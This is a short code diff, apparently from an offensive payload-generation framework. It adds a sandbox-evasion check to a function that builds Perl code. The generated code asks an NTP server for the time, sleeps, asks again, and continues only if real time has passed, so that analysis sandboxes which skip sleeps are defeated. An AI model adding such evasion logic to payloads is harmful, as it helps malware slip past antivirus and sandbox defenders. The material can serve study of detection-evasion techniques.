@@ -197,6 +197,21 @@ def senecas_games(evasion_payload):
             # Add a tab for this check
             num_tabs_required += 1
 
+        if evasion_payload.required_options["SLEEP"][0].lower() != "x":
+
+            check_code += '\t' * num_tabs_required + 'use IO::Socket;'
+            check_code += '\t' * num_tabs_required + 'my $firstTime;my $secondTime;my $sock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);'
+            check_code += '\t' * num_tabs_required + 'my $NTPTransmit = pack("B384", "00100011", (0)x14);my $secondTransmit = pack("B384", "00100011", (0)x14);'
+            check_code += '\t' * num_tabs_required + '$sock->send($NTPTransmit);$sock->recv($NTPTransmit, 384);my ($Ignore, $firstTime, $Ignore2)=unpack("B319 N B32",$NTPTransmit);$firstTime -= 2208988800;$sock->close;'
+            check_code += '\t' * num_tabs_required + 'sleep ' + evasion_payload.required_options["SLEEP"][0] + ';'
+            check_code += '\t' * num_tabs_required + 'my $newSock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);'
+            check_code += '\t' * num_tabs_required + '$newSock->send($secondTransmit);$newSock->recv($secondTransmit, 384);my ($Ignore, $secondTime, $Ignore2)=unpack("B319 N B32",$secondTransmit);$newSock->close;'
+            check_code += '\t' * num_tabs_required + 'my $newSock = IO::Socket::INET->new(Proto => "udp",PeerPort => 123,PeerAddr => "us.pool.ntp.org",Timeout => 4);'
+            check_code += '\t' * num_tabs_required + 'if ((($secondTime - 2208988800) - $firstTime) >= 2) {'
+
+            # Add a tab for this check
+            num_tabs_required += 1
+
         # Return check information
         return check_code, num_tabs_required
 
